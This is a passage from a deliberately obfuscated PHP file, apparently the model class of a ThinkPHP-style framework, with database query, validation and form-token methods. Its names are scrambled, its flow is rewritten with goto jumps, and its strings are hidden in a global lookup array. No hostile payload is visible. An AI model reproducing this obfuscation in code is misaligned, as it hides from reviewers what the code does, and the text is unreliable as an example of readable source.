unset($dàË°ÓŒ[$Dõºô¿‡Ê‚[271]][$d¦§•µ‰óÄ]); } } } $this->_options_filter($dàË°ÓŒ); return $dàË°ÓŒ; goto a¨¿†ÊÄá‚; D¸ÂÆ©»ë»: $Dõºô¿‡Ê‚ =& $_SERVER[¢ÌÛ]; if (is_array($dàË°ÓŒ)) { $dàË°ÓŒ = array_merge($this->options, $dàË°ÓŒ); } $this->options = array(); goto eàËÓÎî; a¨¿†ÊÄá‚: } protected function _options_filter(&$BÌ¥óÇ˜ÀÙ) { } protected function _parseType(&$D‰‹Òçë­—, $B­˜»“¶Ç) { $có„ÊßË‘ë =& $_SERVER[¢ÌÛ]; if (empty($this->options[$có„ÊßË‘ë[281]][$có„ÊßË‘ë[4] . $B­˜»“¶Ç])) { $f‹à™ù‘« = strtolower($this->fields[$có„ÊßË‘ë[248]][$B­˜»“¶Ç]); if (!1 !== strpos($f‹à™ù‘«, $có„ÊßË‘ë[282])) { } elseif (!1 === strpos($f‹à™ù‘«, $có„ÊßË‘ë[283]) && !1 !== strpos($f‹à™ù‘«, $có„ÊßË‘ë[284])) { $D‰‹Òçë­—[$B­˜»“¶Ç] = intval($D‰‹Òçë­—[$B­˜»“¶Ç]); } elseif (!1 !== strpos($f‹à™ù‘«, $có„ÊßË‘ë[285]) || !1 !== strpos($f‹à™ù‘«, $có„ÊßË‘ë[286])) { $D‰‹Òçë­—[$B­˜»“¶Ç] = floatval($D‰‹Òçë­—[$B­˜»“¶Ç]); } elseif (!1 !== strpos($f‹à™ù‘«, $có„ÊßË‘ë[287])) { $D‰‹Òçë­—[$B­˜»“¶Ç] = (bool) $D‰‹Òçë­—[$B­˜»“¶Ç]; } } } public function find($fĞ†¤ëÊĞ® = array()) { goto BóíÙÍóéÉ; BóíÙÍóéÉ: $Cˆ¼±¹İ®Ö =& $_SERVER[¢ÌÛ]; if (is_numeric($fĞ†¤ëÊĞ®) || is_string($fĞ†¤ëÊĞ®)) { $Bãêôµğ‰[$this->getPk()] = intval($fĞ†¤ëÊĞ®); $this->options[$Cˆ¼±¹İ®Ö[271]] = $Bãêôµğ‰; } $this->options[$Cˆ¼±¹İ®Ö[288]] = 1; goto c’Ï²ôäùÄ; b…Æ¹çÒá: if (empty($d‘ù¼Åİ)) { return null; } $this->data = $d‘ù¼Åİ[0]; $this->_afterFind($this->data, $fĞ†¤ëÊĞ®); goto A¸×ÕÎÛ ; A¸×ÕÎÛ : if (!empty($this->options[$Cˆ¼±¹İ®Ö[289]])) { return $this->returnResult($this->data, $this->options[$Cˆ¼±¹İ®Ö[289]]); } return $this->data; goto DÄ˜É”–öö; c’Ï²ôäùÄ: $fĞ†¤ëÊĞ® = $this->_parseOptions(); $d‘ù¼Åİ = $this->db->select($fĞ†¤ëÊĞ®); if (!1 === $d‘ù¼Åİ) { return !1; } goto b…Æ¹çÒá; DÄ˜É”–öö: } protected function _afterFind(&$cäÎê†ÕÍš, $C›åÛ¨°‰) { } protected function returnResult($CîÎºÈô¦ç, $c¬¡‚¦£Ãò = '') { $BÈ·Ùó™Í =& $_SERVER[¢ÌÛ]; if ($c¬¡‚¦£Ãò) { if (is_callable($c¬¡‚¦£Ãò)) { return call_user_func($c¬¡‚¦£Ãò, $CîÎºÈô¦ç); } switch (strtolower($c¬¡‚¦£Ãò)) { case $BÈ·Ùó™Í[290]: return json_encode($CîÎºÈô¦ç); case $BÈ·Ùó™Í[291]: return xml_encode($CîÎºÈô¦ç); } } return $CîÎºÈô¦ç; } public function parseFieldsMap($BÈô¨¹¦¾­, $d‘Öİ¹ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $d¯¹«ñŸ˜´ => $Bôˆ¥ÎĞ•Ë) { if ($d‘Öİ¹ == 1) { if (isset($BÈô¨¹¦¾­[$Bôˆ¥ÎĞ•Ë])) { $BÈô¨¹¦¾­[$d¯¹«ñŸ˜´] = $BÈô¨¹¦¾­[$Bôˆ¥ÎĞ•Ë]; unset($BÈô¨¹¦¾­[$Bôˆ¥ÎĞ•Ë]); } } else { if (isset($BÈô¨¹¦¾­[$d¯¹«ñŸ˜´])) { $BÈô¨¹¦¾­[$Bôˆ¥ÎĞ•Ë] = $BÈô¨¹¦¾­[$d¯¹«ñŸ˜´]; unset($BÈô¨¹¦¾­[$d¯¹«ñŸ˜´]); } } } } return $BÈô¨¹¦¾­; } public function setField($f°’İÔ¤İï, $aõ¬ß·ˆ”ñ = '') { if (is_array($f°’İÔ¤İï)) { $c‚™…’Äù = $f°’İÔ¤İï; } else { $c‚™…’Äù[$f°’İÔ¤İï] = $aõ¬ß·ˆ”ñ; } return $this->save($c‚™…’Äù); } public function setAdd($eã£—à¼, $eÃ‡•·ğµö = 1) { $D¯–ƒ•–Úß =& $_SERVER[¢ÌÛ]; $c ô–‚ô¶ = $eã£—à¼ . $D¯–ƒ•–Úß[292] . $eÃ‡•·ğµö; if ($eÃ‡•·ğµö < 0) { $c ô–‚ô¶ = $eã£—à¼ . $eÃ‡•·ğµö; } return $this->setField($eã£—à¼, array($D¯–ƒ•–Úß[293], $c ô–‚ô¶)); } public function getField($EÄ°Ú“©Ï¡, $BË‹¼£‡“ = null) { $cï¶œÆÁäØ =& $_SERVER[¢ÌÛ]; $EÀã¶óÖŠ[$cï¶œÆÁäØ[269]] = $EÄ°Ú“©Ï¡; $EÀã¶óÖŠ = $this->_parseOptions($EÀã¶óÖŠ); $EÄ°Ú“©Ï¡ = trim($EÄ°Ú“©Ï¡); if (strpos($EÄ°Ú“©Ï¡, $cï¶œÆÁäØ[47])) { if (!isset($EÀã¶óÖŠ[$cï¶œÆÁäØ[288]])) { $EÀã¶óÖŠ[$cï¶œÆÁäØ[288]] = is_numeric($BË‹¼£‡“) ? $BË‹¼£‡“ : $cï¶œÆÁäØ[33]; } $cÕ„«’·–Ñ = $this->db->select($EÀã¶óÖŠ); if (!empty($cÕ„«’·–Ñ)) { goto b­“çêò®; dÖƒÀÚ¹ : $dâöáÕîÔğ = array_shift($EÄ°Ú“©Ï¡); $e‚âµÊ§ = array(); $B¿·¨˜¼Ö = count($eõƒëù‡Í›); goto AŒÄÏŸ‰æº; AŒÄÏŸ‰æº: foreach ($cÕ„«’·–Ñ as $B¡¸ëÓ©ÕÄ) { $Eä§Ù¢— = $B¡¸ëÓ©ÕÄ[$eì­‹ÀÖ®¢]; if (2 == $B¿·¨˜¼Ö) { $e‚âµÊ§[$Eä§Ù¢—] = $B¡¸ëÓ©ÕÄ[$dâöáÕîÔğ]; } else { $e‚âµÊ§[$Eä§Ù¢—] = is_string($BË‹¼£‡“) ? implode($BË‹¼£‡“, $B¡¸ëÓ©ÕÄ) : $B¡¸ëÓ©ÕÄ; } } return $e‚âµÊ§; goto cõÉËÍÎİ; b­“çêò®: $eõƒëù‡Í› = explode($cï¶œÆÁäØ[47], $EÄ°Ú“©Ï¡); $EÄ°Ú“©Ï¡ = array_keys($cÕ„«’·–Ñ[0]); $eì­‹ÀÖ®¢ = array_shift($EÄ°Ú“©Ï¡); goto dÖƒÀÚ¹ ; cõÉËÍÎİ: } } else { if (!0 !== $BË‹¼£‡“) { $EÀã¶óÖŠ[$cï¶œÆÁäØ[288]] = is_numeric($BË‹¼£‡“) ? $BË‹¼£‡“ : 1; } if ($BË‹¼£‡“ === $cï¶œÆÁäØ[251]) { unset($EÀã¶óÖŠ[$cï¶œÆÁäØ[288]]); } $B¡¸ëÓ©ÕÄ = $this->db->select($EÀã¶óÖŠ); if (!empty($B¡¸ëÓ©ÕÄ)) { if ($BË‹¼£‡“ === $cï¶œÆÁäØ[251]) { return reset($B¡¸ëÓ©ÕÄ[0]); } if (!0 !== $BË‹¼£‡“ && 1 == $EÀã¶óÖŠ[$cï¶œÆÁäØ[288]]) { return reset($B¡¸ëÓ©ÕÄ[0]); } foreach ($B¡¸ëÓ©ÕÄ as $A÷…‘œÀ‚) { $e’ïã¿ƒé©[] = $A÷…‘œÀ‚[$EÄ°Ú“©Ï¡]; } return $e’ïã¿ƒé©; } } return null; } public function create($Eó‰ŞêÊÊÈ = '', $b‹‚£¤„Ÿ‘ = '') { goto b”¨×âò†Ä; A„ƒ‘‚¤Á: return $Eó‰ŞêÊÊÈ; goto F‰Í«’ïÖŒ; BòÔÜäÓ¼: if (isset($A´¦â±ôá›)) { if (is_string($A´¦â±ôá›)) { $A´¦â±ôá› = explode($bøé“Â©ß¸[47], $A´¦â±ôá›); } if (think_config($bøé“Â©ß¸[294])) { $A´¦â±ôá›[] = think_config($bøé“Â©ß¸[295]); } foreach ($Eó‰ŞêÊÊÈ as $A£ÄÛ¿É” => $D¶Ñ¡ùà÷À) { if (!in_array($A£ÄÛ¿É”, $A´¦â±ôá›)) { unset($Eó‰ŞêÊÊÈ[$A£ÄÛ¿É”]); } } } if (!$this->autoValidation($Eó‰ŞêÊÊÈ, $b‹‚£¤„Ÿ‘)) { return !1; } if (!$this->autoCheckToken($Eó‰ŞêÊÊÈ)) { $this->error = think_lang($bøé“Â©ß¸[296]); return !1; } goto d›¸šÊ†Äæ; B©‡âìÓßÏ: $Eó‰ŞêÊÊÈ = $this->parseFieldsMap($Eó‰ŞêÊÊÈ, 0); $b‹‚£¤„Ÿ‘ = $b‹‚£¤„Ÿ‘ ? $b‹‚£¤„Ÿ‘ : (!empty($Eó‰ŞêÊÊÈ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$bøé“Â©ß¸[269]])) { $A´¦â±ôá› = $this->options[$bøé“Â©ß¸[269]]; unset($this->options[$bøé“Â©ß¸[269]]); } elseif ($b‹‚£¤„Ÿ‘ == THINK_MODEL_INSERT && isset($this->insertFields)) { $A´¦â±ôá› = $this->insertFields; } elseif ($b‹‚£¤„Ÿ‘ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $A´¦â±ôá› = $this->updateFields; } goto BòÔÜäÓ¼; d›¸šÊ†Äæ: if ($this->autoCheckFields) { $A´¦â±ôá› = $this->getDbFields(); foreach ($Eó‰ŞêÊÊÈ as $A£ÄÛ¿É” => $D¶Ñ¡ùà÷À) { if (!in_array($A£ÄÛ¿É”, $A´¦â±ôá›)) { unset($Eó‰ŞêÊÊÈ[$A£ÄÛ¿É”]); } elseif (MAGIC_QUOTES_GPC && is_string($D¶Ñ¡ùà÷À)) { $Eó‰ŞêÊÊÈ[$A£ÄÛ¿É”] = stripslashes($D¶Ñ¡ùà÷À); } } } $this->autoOperation($Eó‰ŞêÊÊÈ, $b‹‚£¤„Ÿ‘); $this->data = $Eó‰ŞêÊÊÈ; goto A„ƒ‘‚¤Á; b”¨×âò†Ä: $bøé“Â©ß¸ =& $_SERVER[¢ÌÛ]; if (empty($Eó‰ŞêÊÊÈ)) { $Eó‰ŞêÊÊÈ = $_POST; } elseif (is_object($Eó‰ŞêÊÊÈ)) { $Eó‰ŞêÊÊÈ = get_object_vars($Eó‰ŞêÊÊÈ); } if (empty($Eó‰ŞêÊÊÈ) || !is_array($Eó‰ŞêÊÊÈ)) { $this->error = think_lang($bøé“Â©ß¸[267]); return !1; } goto B©‡âìÓßÏ; F‰Í«’ïÖŒ: } public function autoCheckToken($F½åä–’ÜË) { $E¥­ÍåÚÅ =& $_SERVER[¢ÌÛ]; if (isset($this->options[$E¥­ÍåÚÅ[297]]) && !$this->options[$E¥­ÍåÚÅ[297]]) { return !0; } if (think_config($E¥­ÍåÚÅ[294])) { $b›ù¨–Š»Ë = think_config($E¥­ÍåÚÅ[295]); if (!isset($F½åä–’ÜË[$b›ù¨–Š»Ë]) || Session::get($b›ù¨–Š»Ë)) { return !1; } list($Bö³Ô¤‚ßğ, $f†”“è£) = explode($E¥­ÍåÚÅ[70], $F½åä–’ÜË[$b›ù¨–Š»Ë]); if ($f†”“è£ && Session::get($b›ù¨–Š»Ë . $E¥­ÍåÚÅ[94] . $Bö³Ô¤‚ßğ) === $f†”“è£) { Session::remove($b›ù¨–Š»Ë . $E¥­ÍåÚÅ[94] . $Bö³Ô¤‚ßğ); return !0; } if (think_config($E¥­ÍåÚÅ[298])) { Session::remove($b›ù¨–Š»Ë . $E¥­ÍåÚÅ[94] . $Bö³Ô¤‚ßğ); } return !1; } return !0; } public function regex($eß…‰Â÷ÁŠ, $bç¡İé¥Î²) { $B·¡Ë°§ =& $_SERVER[¢ÌÛ]; $CÀˆ¢…¶À = array($B·¡Ë°§[299] => $B·¡Ë°§[300], $B·¡Ë°§[301] => $B·¡Ë°§[302], $B·¡Ë°§[303] => $B·¡Ë°§[304], $B·¡Ë°§[305] => $B·¡Ë°§[306], $B·¡Ë°§[307] => $B·¡Ë°§[308], $B·¡Ë°§[309] => $B·¡Ë°§[310], $B·¡Ë°§[311] => $B·¡Ë°§[312], $B·¡Ë°§[286] => $B·¡Ë°§[313], $B·¡Ë°§[314] => $B·¡Ë°§[315]); if (isset($CÀˆ¢…¶À[strtolower($bç¡İé¥Î²)])) { $bç¡İé¥Î² = $CÀˆ¢…¶À[strtolower($bç¡İé¥Î²)]; } return preg_match($bç¡İé¥Î², $eß…‰Â÷ÁŠ) === 1; } private function autoOperation(&$d³¼ˆñÀã¹, $A¹Ï‚ÔˆÇø) { $Eœª´¶„ö =& $_SERVER[¢ÌÛ]; if (!empty($this->options[$Eœª´¶„ö[316]])) { $Eì‹×”¡ªÅ = $this->options[$Eœª´¶„ö[316]]; unset($this->options[$Eœª´¶„ö[316]]); } elseif (!empty($this->_auto)) { $Eì‹×”¡ªÅ = $this->_auto; } if (isset($Eì‹×”¡ªÅ)) { foreach ($Eì‹×”¡ªÅ as $eñÇÜ·£Û…) { if (empty($eñÇÜ·£Û…[2])) { $eñÇÜ·£Û…[2] = THINK_MODEL_INSERT; } if ($A¹Ï‚ÔˆÇø == $eñÇÜ·£Û…[2] || $eñÇÜ·£Û…[2] == THINK_MODEL_BOTH) { switch (trim($eñÇÜ·£Û…[3])) { case $Eœª´¶„ö[317]: case $Eœª´¶„ö[318]: $AšŞÑªƒ×¨ = isset($eñÇÜ·£Û…[4]) ? (array) $eñÇÜ·£Û…[4] : array(); if (isset($d³¼ˆñÀã¹[$eñÇÜ·£Û…[0]])) { array_unshift($AšŞÑªƒ×¨, $d³¼ˆñÀã¹[$eñÇÜ·£Û…[0]]); } if ($Eœª´¶„ö[317] == $eñÇÜ·£Û…[3]) { $d³¼ˆñÀã¹[$eñÇÜ·£Û…[0]] = call_user_func_array($eñÇÜ·£Û…[1], $AšŞÑªƒ×¨); } else { $d³¼ˆñÀã¹[$eñÇÜ·£Û…[0]] = call_user_func_array(array(&$this, $eñÇÜ·£Û…[1]), $AšŞÑªƒ×¨); } break; case $Eœª´¶„ö[269]: $d³¼ˆñÀã¹[$eñÇÜ·£Û…[0]] = $d³¼ˆñÀã¹[$eñÇÜ·£Û…[1]]; break; case $Eœª´¶„ö[319]: if ($Eœª´¶„ö[33] === $d³¼ˆñÀã¹[$eñÇÜ·£Û…[0]]) { unset($d³¼ˆñÀã¹[$eñÇÜ·£Û…[0]]); } break; case $Eœª´¶„ö[320]: default: $d³¼ˆñÀã¹[$eñÇÜ·£Û…[0]] = $eñÇÜ·£Û…[1]; } if (!1 === $d³¼ˆñÀã¹[$eñÇÜ·£Û…[0]]) { unset($d³¼ˆñÀã¹[$eñÇÜ·£Û…[0]]); } } } } return $d³¼ˆñÀã¹; } protected function autoValidation($b¥†ï¯ç¼, $C´¤°ò¸•) { $eˆº´êåº¬ =& $_SERVER[¢ÌÛ]; if (!empty($this->options[$eˆº´êåº¬[321]])) { $AóÜáµÓ£† = $this->options[$eˆº´êåº¬[321]]; unset($this->options[$eˆº´êåº¬[321]]); } elseif (!empty($this->_validate)) { $AóÜáµÓ£† = $this->_validate; } if (isset($AóÜáµÓ£†)) { if ($this->patchValidate) { $this->error = array(); } foreach ($AóÜáµÓ£† as $B›ìé°éšé => $D¢é¢ØÔØò) { if (empty($D¢é¢ØÔØò[5]) || $D¢é¢ØÔØò[5] == THINK_MODEL_BOTH || $D¢é¢ØÔØò[5] == $C´¤°ò¸•) { if (0 == strpos($D¢é¢ØÔØò[2], $eˆº´êåº¬[322]) && strpos($D¢é¢ØÔØò[2], $eˆº´êåº¬[323])) { $D¢é¢ØÔØò[2] = think_lang(substr($D¢é¢ØÔØò[2], 2, -1)); } $D¢é¢ØÔØò[3] = isset($D¢é¢ØÔØò[3]) ? $D¢é¢ØÔØò[3] : THINK_EXISTS_VALIDATE; $D¢é¢ØÔØò[4] = isset($D¢é¢ØÔØò[4]) ? $D¢é¢ØÔØò[4] : $eˆº´êåº¬[324]; switch ($D¢é¢ØÔØò[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($b¥†ï¯ç¼, $D¢é¢ØÔØò)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($eˆº´êåº¬[33] != trim($b¥†ï¯ç¼[$D¢é¢ØÔØò[0]])) { if (!1 === $this->_validationField($b¥†ï¯ç¼, $D¢é¢ØÔØò)) { return !1; } } break; default: if (isset($b¥†ï¯ç¼[$D¢é¢ØÔØò[0]])) { if (!1 === $this->_validationField($b¥†ï¯ç¼, $D¢é¢ØÔØò)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($fÄÏ¶È¿ñ’, $B…š¨œµ÷) { if (!1 === $this->_validationFieldItem($fÄÏ¶È¿ñ’, $B…š¨œµ÷)) { if ($this->patchValidate) { $this->error[$B…š¨œµ÷[0]] = $B…š¨œµ÷[2]; } else { $this->error = $B…š¨œµ÷[2]; return !1; } } return; } protected function _validationFieldItem($EÈÌ†èÇŠ„, $FöÕ»Ï¦¶) { $fŠØ’ã„©º =& $_SERVER[¢ÌÛ]; switch (strtolower(trim($FöÕ»Ï¦¶[4]))) { case $fŠØ’ã„©º[317]: case $fŠØ’ã„©º[318]: $a‰ğå™ÁòÂ = isset($FöÕ»Ï¦¶[6]) ? (array) $FöÕ»Ï¦¶[6] : array(); if (is_string($FöÕ»Ï¦¶[0]) && strpos($FöÕ»Ï¦¶[0], $fŠØ’ã„©º[47])) { $FöÕ»Ï¦¶[0] = explode($fŠØ’ã„©º[47], $FöÕ»Ï¦¶[0]); } if (is_array($FöÕ»Ï¦¶[0])) { foreach ($FöÕ»Ï¦¶[0] as $AöÈÒîœ÷ç) { $D“äÒ…¬Ëæ[$AöÈÒîœ÷ç] = $EÈÌ†èÇŠ„[$AöÈÒîœ÷ç]; } array_unshift($a‰ğå™ÁòÂ, $D“äÒ…¬Ëæ); } else { array_unshift($a‰ğå™ÁòÂ, $EÈÌ†èÇŠ„[$FöÕ»Ï¦¶[0]]); } if ($fŠØ’ã„©º[317] == $FöÕ»Ï¦¶[4]) { return call_user_func_array($FöÕ»Ï¦¶[1], $a‰ğå™ÁòÂ); } else { return call_user_func_array(array(&$this, $FöÕ»Ï¦¶[1]), $a‰ğå™ÁòÂ); } case $fŠØ’ã„©º[325]: return $EÈÌ†èÇŠ„[$FöÕ»Ï¦¶[0]] == $EÈÌ†èÇŠ„[$FöÕ»Ï¦¶[1]]; case $fŠØ’ã„©º[326]: if (is_string($FöÕ»Ï¦¶[0]) && strpos($FöÕ»Ï¦¶[0], $fŠØ’ã„©º[47])) { $FöÕ»Ï¦¶[0] = explode($fŠØ’ã„©º[47], $FöÕ»Ï¦¶[0]); } $B®´™ùí™À = array(); if (is_array($FöÕ»Ï¦¶[0])) { foreach ($FöÕ»Ï¦¶[0] as $AöÈÒîœ÷ç) { $B®´™ùí™À[$AöÈÒîœ÷ç] = $EÈÌ†èÇŠ„[$AöÈÒîœ÷ç]; } } else { $B®´™ùí™À[$FöÕ»Ï¦¶[0]] = $EÈÌ†èÇŠ„[$FöÕ»Ï¦¶[0]]; } if (!empty($EÈÌ†èÇŠ„[$this->getPk()])) { $B®´™ùí™À[$this->getPk()] = array($fŠØ’ã„©º[327], $EÈÌ†èÇŠ„[$this->getPk()]); } if ($this->where($B®´™ùí™À)->find()) { return !1; } return !0; default: return $this->check($EÈÌ†èÇŠ„[$FöÕ»Ï¦¶[0]], $FöÕ»Ï¦¶[1], $FöÕ»Ï¦¶[4]); } } public function check($A’±ã³øÎ, $f »°¹ôœÀ, $F–èî¶¶ßô = "\x72\145\147\145\170") { $dŠ²Òæñ³î =& $_SERVER[¢ÌÛ]; $F–èî¶¶ßô = strtolower(trim($F–èî¶¶ßô)); switch ($F–èî¶¶ßô) { case $dŠ²Òæñ³î[7]: case $dŠ²Òæñ³î[328]: $fãÖƒİËêò = is_array($f »°¹ôœÀ) ? $f »°¹ôœÀ : explode($dŠ²Òæñ³î[47], $f »°¹ôœÀ); return $F–èî¶¶ßô == $dŠ²Òæñ³î[7] ? in_array($A’±ã³øÎ, $fãÖƒİËêò) : !in_array($A’±ã³øÎ, $fãÖƒİËêò); case $dŠ²Òæñ³î[329]: case $dŠ²Òæñ³î[330]: if (is_array($f »°¹ôœÀ)) { $Bµì›ßÉ¦ = $f »°¹ôœÀ[0]; $aöŸõ­ö›Ş = $f »°¹ôœÀ[1]; } else { list($Bµì›ßÉ¦, $aöŸõ­ö›Ş) = explode($dŠ²Òæñ³î[47], $f »°¹ôœÀ); } return $F–èî¶¶ßô == $dŠ²Òæñ³î[329] ? $A’±ã³øÎ >= $Bµì›ßÉ¦ && $A’±ã³øÎ <= $aöŸõ­ö›Ş : $A’±ã³øÎ < $Bµì›ßÉ¦ || $A’±ã³øÎ > $aöŸõ­ö›Ş; case $dŠ²Òæñ³î[331]: case $dŠ²Òæñ³î[332]: return $F–èî¶¶ßô == $dŠ²Òæñ³î[331] ? $A’±ã³øÎ == $f »°¹ôœÀ : $A’±ã³øÎ != $f »°¹ôœÀ; case $dŠ²Òæñ³î[333]: $e™ÒÎÛ´×Î = mb_strlen($A’±ã³øÎ, $dŠ²Òæñ³î[334]); if (strpos($f »°¹ôœÀ, $dŠ²Òæñ³î[47])) { list($Bµì›ßÉ¦, $aöŸõ­ö›Ş) = explode($dŠ²Òæñ³î[47], $f »°¹ôœÀ); return $e™ÒÎÛ´×Î >= $Bµì›ßÉ¦ && $e™ÒÎÛ´×Î <= $aöŸõ­ö›Ş; } else { return $e™ÒÎÛ´×Î == $f »°¹ôœÀ; } case $dŠ²Òæñ³î[335]: list($eÓìòØÖ¥ï, $dñÃòØ¿×—) = explode($dŠ²Òæñ³î[47], $f »°¹ôœÀ); if (!is_numeric($eÓìòØÖ¥ï)) { $eÓìòØÖ¥ï = strtotime($eÓìòØÖ¥ï); } if (!is_numeric($dñÃòØ¿×—)) { $dñÃòØ¿×— = strtotime($dñÃòØ¿×—); } return NOW_TIME >= $eÓìòØÖ¥ï && NOW_TIME <= $dñÃòØ¿×—; case $dŠ²Òæñ³î[336]: return in_array(get_client_ip(), explode($dŠ²Òæñ³î[47], $f »°¹ôœÀ)); case $dŠ²Òæñ³î[337]: return !in_array(get_client_ip(), explode($dŠ²Òæñ³î[47], $f »°¹ôœÀ)); case $dŠ²Òæñ³î[324]: default: return $this->regex($A’±ã³øÎ, $f »°¹ôœÀ); } } public function query($cÖöÖ–‰÷©, $Dãéš¿Ù„£ = false) { $BàãÃŒƒ³ =& $_SERVER[¢ÌÛ]; if (!is_bool($Dãéš¿Ù„£) && !is_array($Dãéš¿Ù„£)) { $Dãéš¿Ù„£ = func_get_args(); array_shift($Dãéš¿Ù„£); } $cÖöÖ–‰÷© = str_replace(array($BàãÃŒƒ³[227], $BàãÃŒƒ³[338]), $BàãÃŒƒ³[50], $cÖöÖ–‰÷©); $cÖöÖ–‰÷© = $this->parseSql($cÖöÖ–‰÷©, $Dãéš¿Ù„£); return $this->db->query($cÖöÖ–‰÷©); } public function execute($BÇîÓ†ñ¬Ö, $Bê„Å×Ø¨ö = false) { if (!is_bool($Bê„Å×Ø¨ö) && !is_array($Bê„Å×Ø¨ö)) { $Bê„Å×Ø¨ö = func_get_args(); array_shift($Bê„Å×Ø¨ö); } $BÇîÓ†ñ¬Ö = $this->parseSql($BÇîÓ†ñ¬Ö, $Bê„Å×Ø¨ö); return $this->db->execute($BÇîÓ†ñ¬Ö); } protected function parseSql($fíÍ…µ—±‰, $Eˆ»¢èÎ»‰) { $eé©‚„´Û¹ =& $_SERVER[¢ÌÛ]; if (!0 === $Eˆ»¢èÎ»‰) { $F’ŠĞŸØ÷š = $this->_parseOptions(); $fíÍ…µ—±‰ = $this->db->parseSql($fíÍ…µ—±‰, $F’ŠĞŸØ÷š); } elseif (is_array($Eˆ»¢èÎ»‰)) { $Eˆ»¢èÎ»‰ = array_map(array($this->db, $eé©‚„´Û¹[339]), $Eˆ»¢èÎ»‰); $fíÍ…µ—±‰ = vsprintf($fíÍ…µ—±‰, $Eˆ»¢èÎ»‰); } else { $fíÍ…µ—±‰ = strtr($fíÍ…µ—±‰, array($eé©‚„´Û¹[340] => $this->getTableName(), $eé©‚„´Û¹[341] => think_config($eé©‚„´Û¹[240]))); } $this->db->setModel($this->name); return $fíÍ…µ—±‰; } public function db($A÷åº‚ÌÆÈ = '', $Bè½ñÔÏ› = '', $BÄ¼Ê¸ÌëÌ = array()) { goto bÃÌ«…÷õÛ; eª˜ª„‡²¡: static $c ğèïÓÒ‹ = array(); if (!isset($c ğèïÓÒ‹[$A÷åº‚ÌÆÈ]) || isset($c ğèïÓÒ‹[$A÷åº‚ÌÆÈ]) && $Bè½ñÔÏ› && $E†æÂ‰ëÎŞ[$A÷åº‚ÌÆÈ] != $Bè½ñÔÏ›) { if (!empty($Bè½ñÔÏ›) && is_string($Bè½ñÔÏ›) && !1 === strpos($Bè½ñÔÏ›, $E©–×…Âù‡[8])) { $Bè½ñÔÏ› = think_config($Bè½ñÔÏ›); } $c ğèïÓÒ‹[$A÷åº‚ÌÆÈ] = Db::getInstance($Bè½ñÔÏ›); } elseif (NULL === $Bè½ñÔÏ›) { $c ğèïÓÒ‹[$A÷åº‚ÌÆÈ]->close(); unset($c ğèïÓÒ‹[$A÷åº‚ÌÆÈ]); return; } if (!empty($BÄ¼Ê¸ÌëÌ)) { if (is_string($BÄ¼Ê¸ÌëÌ)) { parse_str($BÄ¼Ê¸ÌëÌ, $BÄ¼Ê¸ÌëÌ); } foreach ($BÄ¼Ê¸ÌëÌ as $eî“êˆç¾Œ => $dÑ®îîÆ‚É) { $this->setProperty($eî“êˆç¾Œ, $dÑ®îîÆ‚É); } } goto F®íé×Ë; bÃÌ«…÷õÛ: $E©–×…Âù‡ =& $_SERVER[¢ÌÛ]; if ($E©–×…Âù‡[33] === $A÷åº‚ÌÆÈ && $this->db) { return $this->db; } static $E†æÂ‰ëÎŞ = array(); goto eª˜ª„‡²¡; BŒğ£‡Ìá”: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto B–ù°ç­¤é; F®íé×Ë: $E†æÂ‰ëÎŞ[$A÷åº‚ÌÆÈ] = $Bè½ñÔÏ›; $this->db = $c ğèïÓÒ‹[$A÷åº‚ÌÆÈ]; $this->_after_db(); goto BŒğ£‡Ìá”; B–ù°ç­¤é: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $f¿ÆÒ°­ª = get_class($this); if ($f¿ÆÒ°­ª == $_SERVER[¢ÌÛ][342]) { return $this->name; } $this->name = substr($f¿ÆÒ°­ª, 0, -5); } return $this->name; } public function getTableName() { $F·÷±²ÃĞà =& $_SERVER[¢ÌÛ]; if (empty($this->trueTableName)) { $F«àÚ¡¥¨ = !empty($this->tablePrefix) ? $this->tablePrefix : $F·÷±²ÃĞà[33]; if (!empty($this->tableName)) { $F«àÚ¡¥¨ .= $this->tableName; } else { $F«àÚ¡¥¨ .= think_parse_name($this->name); } $this->trueTableName = strtolower($F«àÚ¡¥¨); } return (!empty($this->dbName) ? $this->dbName . $F·÷±²ÃĞà[94] : $F·÷±²ÃĞà[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $eÇÂíÂÜ¬Ñ =& $_SERVER[¢ÌÛ]; return isset($this->fields[$eÇÂíÂÜ¬Ñ[247]]) ? $this->fields[$eÇÂíÂÜ¬Ñ[247]] : $this->pk; } public function getDbFields() { $E«¸ÂĞ®Ğ¬ =& $_SERVER[¢ÌÛ]; if (isset($this->options[$E«¸ÂĞ®Ğ¬[275]])) { $dÆîÄ¦ƒˆ = $this->db->getFields($this->options[$E«¸ÂĞ®Ğ¬[275]]); return $dÆîÄ¦ƒˆ ? array_keys($dÆîÄ¦ƒˆ) : !1; } if ($this->fields) { $dÆîÄ¦ƒˆ = $this->fields; unset($dÆîÄ¦ƒˆ[$E«¸ÂĞ®Ğ¬[246]], $dÆîÄ¦ƒˆ[$E«¸ÂĞ®Ğ¬[247]], $dÆîÄ¦ƒˆ[$E«¸ÂĞ®Ğ¬[248]], $dÆîÄ¦ƒˆ[$E«¸ÂĞ®Ğ¬[245]]); return $dÆîÄ¦ƒˆ; } return !1; } public function data($F èªÁ¬Ê = '') { $E‚ô»­»½ =& $_SERVER[¢ÌÛ]; if ($E‚ô»­»½[33] === $F èªÁ¬Ê && !empty($this->data)) { return $this->data; } if (is_object($F èªÁ¬Ê)) { $F èªÁ¬Ê = get_object_vars($F èªÁ¬Ê); } elseif (is_string($F èªÁ¬Ê)) { parse_str($F èªÁ¬Ê, $F èªÁ¬Ê); } elseif (!is_array($F èªÁ¬Ê)) { think_exception(think_lang($E‚ô»­»½[267])); } $this->data = $F èªÁ¬Ê; return $this; } public function join($C‘àÅÒàª) { $C ¡‰¡ä¤ =& $_SERVER[¢ÌÛ]; if 